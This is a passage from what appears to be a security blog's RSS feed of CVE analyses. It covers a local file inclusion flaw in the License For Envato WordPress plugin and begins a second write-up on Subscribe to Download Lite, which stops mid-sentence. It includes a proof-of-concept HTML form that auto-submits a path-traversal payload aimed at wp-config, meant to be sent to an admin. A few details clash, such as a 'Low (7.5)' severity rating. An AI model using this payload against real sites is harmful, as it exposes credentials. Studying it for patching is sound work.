realpath(&amp;#34;{$licenseEnvato_nav_view}/general.php&amp;#34;);&#xA;            if ($general_template &amp;amp;&amp;amp; strpos($general_template, $nav_view_dir) === 0) {&#xA;                include $general_template;&#xA;            }&#xA;        }&#xA;    }&#xA;    ?&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The patch implements multiple measures to mitigate &lt;strong&gt;LFI&lt;/strong&gt; and harden the handling of the &lt;code&gt;tab&lt;/code&gt; parameter:&lt;/p&gt;&#xA;&lt;ol&gt;&#xA;&lt;li&gt;Use a whitelist &lt;code&gt;$allowed_tabs&lt;/code&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$allowed_tabs = array(&amp;#39;general&amp;#39;, &amp;#39;envato&amp;#39;);&#xA;$allowed_tabs = apply_filters(&amp;#39;license_envato_allowed_tabs&amp;#39;, $allowed_tabs);&lt;/code&gt;&lt;/pre&gt;&lt;ol start=&#34;2&#34;&gt;&#xA;&lt;li&gt;Verify nonce to prevent CSRF&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;if (isset($_GET[&amp;#39;_wpnonce&amp;#39;]) &amp;amp;&amp;amp; wp_verify_nonce(..., &amp;#39;license_envato_switch_tab&amp;#39;))&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;The reason the CVE is labeled &lt;strong&gt;Unauthenticated&lt;/strong&gt; is that an attacker does not need an account on the target site to exploit it. A common technique is to trick an admin (or a privileged user) into visiting a page containing the payload. When the admin opens that page, the browser sends a request to the WordPress site including the admin session cookie — so the request is considered authenticated as the admin. If the plugin accepts and executes the parameter without nonce or permission checks, the LFI payload will be processed and exploited.&lt;/p&gt;&#xA;&lt;ol start=&#34;3&#34;&gt;&#xA;&lt;li&gt;Normalize and validate paths using &lt;a href=&#34;https://www.php.net/manual/en/function.realpath.php&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;code&gt;realpath()&lt;/code&gt;&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ol&gt;&#xA;&lt;pre&gt;&lt;code&gt;$template = realpath(&amp;#34;{$licenseEnvato_nav_view}/{$action}.php&amp;#34;);&#xA;$nav_view_dir = realpath($licenseEnvato_nav_view);&lt;/code&gt;&lt;/pre&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;vulnerable-code&#34;&gt;&lt;span&gt;Vulnerable Code&lt;/span&gt;&#xA;  &lt;a href=&#34;#vulnerable-code&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;pre&gt;&lt;code&gt;public function plugin_page() {&#xA;    $license_envato_api = new EnvatoLicenseApiCall();&#xA;    $settingsView = __DIR__ . &amp;#39;/views/settingsView.php&amp;#39;;&#xA;    if ( file_exists( $settingsView ) ) {&#xA;        include $settingsView;&#xA;    }&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;settingsView.php&lt;/code&gt; is always present in the source, so it is definitely &lt;code&gt;include&lt;/code&gt;d in &lt;code&gt;plugin_page()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;public function admin_menu() {&#xA;    $parent_slug = &amp;#39;licenseenvato&amp;#39;;&#xA;    $capability = &amp;#39;manage_options&amp;#39;;&#xA;&#xA;    add_submenu_page( $parent_slug, __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), __( &amp;#39;Settings&amp;#39;, &amp;#39;licenseenvato&amp;#39; ), $capability, $parent_slug.&amp;#39;-settings&amp;#39;, [ $this, &amp;#39;settings&amp;#39; ] );&#xA;}&#xA;&#xA;public function settings() {&#xA;    $settings = new Settings();&#xA;    $settings-&amp;gt;plugin_page();&#xA;}&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;&lt;code&gt;plugin_page()&lt;/code&gt; is called via the &amp;ldquo;Settings&amp;rdquo; submenu callback, registered in &lt;code&gt;admin_menu()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;p&gt;This submenu requires the &lt;code&gt;manage_options&lt;/code&gt; capability, so it is shown only to admins. When an admin opens the &amp;ldquo;Settings&amp;rdquo; submenu (endpoint &lt;code&gt;licenseenvato-settings&lt;/code&gt;), WordPress calls &lt;code&gt;settings()&lt;/code&gt;, which instantiates the &lt;code&gt;Settings&lt;/code&gt; class and runs &lt;code&gt;plugin_page()&lt;/code&gt;.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;exploit&#34;&gt;&lt;span&gt;Exploit&lt;/span&gt;&#xA;  &lt;a href=&#34;#exploit&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;proof-of-concept-poc&#34;&gt;&lt;span&gt;Proof of Concept (PoC)&lt;/span&gt;&#xA;  &lt;a href=&#34;#proof-of-concept-poc&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-1&#34;&gt;&lt;span&gt;Step 1&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-1&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Create a page that contains the LFI payload&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;!DOCTYPE html&amp;gt;&#xA;&amp;lt;html lang=&amp;#34;en&amp;#34;&amp;gt;&#xA;&amp;lt;head&amp;gt;&#xA;    &amp;lt;meta charset=&amp;#34;UTF-8&amp;#34;&amp;gt;&#xA;    &amp;lt;meta name=&amp;#34;viewport&amp;#34; content=&amp;#34;width=device-width, initial-scale=1.0&amp;#34;&amp;gt;&#xA;    &amp;lt;title&amp;gt;w41bu1&amp;lt;/title&amp;gt;&#xA;&amp;lt;/head&amp;gt;&#xA;&amp;lt;body&amp;gt;&#xA;    &amp;lt;form action=&amp;#34;http://localhost/wp-admin/admin.php&amp;#34; method=&amp;#34;get&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;page&amp;#34; value=&amp;#34;licenseenvato-settings&amp;#34;&amp;gt;&#xA;        &amp;lt;input type=&amp;#34;text&amp;#34; name=&amp;#34;tab&amp;#34; value=&amp;#34;../../../../../../wp-config&amp;#34;&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;    &amp;lt;script&amp;gt;&#xA;        document.forms[0].submit()&#xA;    &amp;lt;/script&amp;gt;&#xA;&amp;lt;/body&amp;gt;&#xA;&amp;lt;/html&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;h4 class=&#34;heading-element&#34; id=&#34;step-2&#34;&gt;&lt;span&gt;Step 2&lt;/span&gt;&#xA;  &lt;a href=&#34;#step-2&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h4&gt;&lt;p&gt;Send the link to the admin&lt;/p&gt;&#xA;&lt;p&gt;&lt;strong&gt;Result&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;p&gt;The debugger jumped to &lt;code&gt;wp-config.php&lt;/code&gt;&lt;/p&gt;&#xA;&lt;figure&gt;&lt;img src=&#34;http://localhost:1313/posts/2025-10-17-cve-2025-39399/result.png&#34;&#xA;    alt=&#34;Successful LFI result&#34;&gt;&lt;figcaption&gt;&#xA;      &lt;p&gt;Successful LFI result&lt;/p&gt;&#xA;    &lt;/figcaption&gt;&#xA;&lt;/figure&gt;&#xA;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;conclusion&#34;&gt;&lt;span&gt;Conclusion&lt;/span&gt;&#xA;  &lt;a href=&#34;#conclusion&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;Version &lt;strong&gt;≤ 1.0.0&lt;/strong&gt; of License For Envato allows LFI because &lt;code&gt;include()&lt;/code&gt; uses &lt;code&gt;$atts[&#39;template&#39;]&lt;/code&gt; without proper validation; the vulnerability was fixed in &lt;strong&gt;1.1.0&lt;/strong&gt; using &lt;code&gt;basename()&lt;/code&gt; + &lt;code&gt;realpath()&lt;/code&gt; and base_dir checks.&lt;/p&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;key-takeaways&#34;&gt;&lt;span&gt;Key takeaways&lt;/span&gt;&#xA;  &lt;a href=&#34;#key-takeaways&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;Using &lt;strong&gt;only &lt;code&gt;sanitize_text_field()&lt;/code&gt; is not sufficient&lt;/strong&gt; to prevent path traversal in PHP.&lt;/li&gt;&#xA;&lt;li&gt;Any parameter used in &lt;code&gt;include()&lt;/code&gt; or file operations &lt;strong&gt;must be controlled by a whitelist or validated via &lt;code&gt;realpath()&lt;/code&gt;&lt;/strong&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CSRF combined with LFI&lt;/strong&gt; can turn an admin-only flaw into an &lt;strong&gt;unauthenticated&lt;/strong&gt; vulnerability if nonce verification is missing.&lt;/li&gt;&#xA;&lt;li&gt;Inputs must be strictly validated and the scope of accessible files restricted, especially in plugins that handle templates or views.&lt;/li&gt;&#xA;&lt;li&gt;Always validate and constrain paths when including files — never trust request data even if it has been “sanitized”.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;references&#34;&gt;&lt;span&gt;References&lt;/span&gt;&#xA;  &lt;a href=&#34;#references&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;&lt;a href=&#34;https://book.hacktricks.wiki/en/pentesting-web/file-inclusion/index.html?highlight=lfi#lfi--rfi-using-php-wrappers--protocols&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;File Inclusion/Path traversal — Hacktrick&lt;/a&gt;&lt;/p&gt;&#xA;&lt;p&gt;&lt;a href=&#34;https://patchstack.com/database/wordpress/plugin/license-envato/vulnerability/wordpress-license-for-envato-plugin-1-0-0-local-file-inclusion-vulnerability?_s_id=cve&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt; WordPress License For Envato Plugin &amp;lt;= 1.0.0 is vulnerable to Local File Inclusion &lt;/a&gt;&lt;/p&gt;</description>
    </item>
    <item>
      <title>CVE-2025-30782 Analysis &amp; POC</title>
      <link>http://localhost:1313/posts/2025-10-16-cve-2025-30782/</link>
      <pubDate>Thu, 16 Oct 2025 19:00:00 +0700</pubDate><author>w41bu1@gmail.com (Bui Van Y)</author>
      <guid>http://localhost:1313/posts/2025-10-16-cve-2025-30782/</guid>
      <category domain="http://localhost:1313/categories/cve-analysis/">CVE Analysis</category>
      <description>&lt;img src=&#34;http://localhost:1313/posts/2025-10-16-cve-2025-30782/app.png&#34; alt=&#34;featured image&#34; referrerpolicy=&#34;no-referrer&#34;&gt;&lt;h2 class=&#34;heading-element&#34; id=&#34;cve--basic-info&#34;&gt;&lt;span&gt;CVE &amp;amp; Basic Info&lt;/span&gt;&#xA;  &lt;a href=&#34;#cve--basic-info&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;p&gt;The &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt; plugin version &lt;strong&gt;≤ 1.2.9&lt;/strong&gt; contains a &lt;strong&gt;Local File Inclusion&lt;/strong&gt; vulnerability that allows an unauthenticated attacker to control the file parameter used in &lt;code&gt;include/require&lt;/code&gt;, thereby including or reading local files on the server (for example configuration files that contain credentials), leading to sensitive information disclosure and, in some configurations, possible code execution.&lt;/p&gt;&#xA;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVE ID&lt;/strong&gt;: &lt;a href=&#34;https://www.cve.org/CVERecord?id=CVE-2025-30782&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;CVE-2025-30782&lt;/a&gt;&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Vulnerability Type&lt;/strong&gt;: Local File Inclusion&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Affected Versions&lt;/strong&gt;: &amp;lt;= 1.2.9&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Patched Versions&lt;/strong&gt;: 1.3.0&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;CVSS severity&lt;/strong&gt;: Low (7.5)&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Required Privilege&lt;/strong&gt;: Contributor&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Product&lt;/strong&gt;: &lt;a href=&#34;https://wordpress.org/plugins/subscribe-to-download-lite/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;WordPress Subscribe to Download Lite Plugin&lt;/a&gt;&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;requirements&#34;&gt;&lt;span&gt;Requirements&lt;/span&gt;&#xA;  &lt;a href=&#34;#requirements&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;ul&gt;&#xA;&lt;li&gt;&lt;strong&gt;Local WordPress &amp;amp; Debugging&lt;/strong&gt;: &lt;a href=&#34;https://w41bu1.github.io/2025-08-21-wordpress-local-and-debugging/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;Local WordPress and Debugging&lt;/a&gt;.&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Plugin versions&lt;/strong&gt; - &lt;strong&gt;Subscribe to Download Lite&lt;/strong&gt;: &lt;strong&gt;1.2.9&lt;/strong&gt; (vulnerable) and &lt;strong&gt;1.3.0&lt;/strong&gt; (patched).&lt;/li&gt;&#xA;&lt;li&gt;&lt;strong&gt;Diff tool&lt;/strong&gt; - &lt;a href=&#34;https://meldmerge.org/&#34; target=&#34;_blank&#34; rel=&#34;external nofollow noopener noreferrer&#34;&gt;&lt;strong&gt;Meld&lt;/strong&gt;&lt;/a&gt; or any diff tool to inspect and compare differences between the two versions.&lt;/li&gt;&#xA;&lt;/ul&gt;&#xA;&lt;h2 class=&#34;heading-element&#34; id=&#34;analysis&#34;&gt;&lt;span&gt;Analysis&lt;/span&gt;&#xA;  &lt;a href=&#34;#analysis&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h2&gt;&lt;h3 class=&#34;heading-element&#34; id=&#34;patch-diff&#34;&gt;&lt;span&gt;Patch diff&lt;/span&gt;&#xA;  &lt;a href=&#34;#patch-diff&#34; class=&#34;heading-mark&#34;&gt;&#xA;    &lt;svg class=&#34;octicon octicon-link&#34; viewBox=&#34;0 0 16 16&#34; version=&#34;1.1&#34; width=&#34;16&#34; height=&#34;16&#34; aria-hidden=&#34;true&#34;&gt;&lt;path d=&#34;m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z&#34;&gt;&lt;/path&gt;&lt;/svg&gt;&#xA;  &lt;/a&gt;&#xA;&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;Vulnerable version&lt;/strong&gt;:&lt;/p&gt;&#xA;&lt;pre&gt;&lt;code&gt;&amp;lt;div class=&amp;#34;stdl-form-wrap stdl-&amp;lt;?php echo esc_attr($form_template); ?&amp;gt; stdl-alias&amp;gt;&amp;#34;&amp;gt;&#xA;    &amp;lt;form method=&amp;#34;post&amp;#34; action=&amp;#34;&amp;#34; class=&amp;#34;stdl-subscription-form&amp;#34; data-form-alias=&amp;#34;stdl&amp;#34;&amp;gt;&#xA;        &amp;lt;?php&#xA;        do_action(&amp;#39;stdl_before_form&amp;#39;, $form_details);&#xA;&#xA;        if (file_exists(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;)) {&#xA;            include(STDL_PATH . &amp;#39;inc/views/frontend/form-templates/&amp;#39; . $form_template . &amp;#39;.php&amp;#39;);&#xA;        }&#xA;        do_action(&amp;#39;stdl_after_form&amp;#39;, $form_details);&#xA;        ?&amp;gt;&#xA;    &amp;lt;/form&amp;gt;&#xA;&amp;lt;/div&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;In the vulnerable version, &lt;code&gt;$form_template&lt;/code&gt; is concatenated into the path and included without validating the input =&amp;gt; LFI risk, for 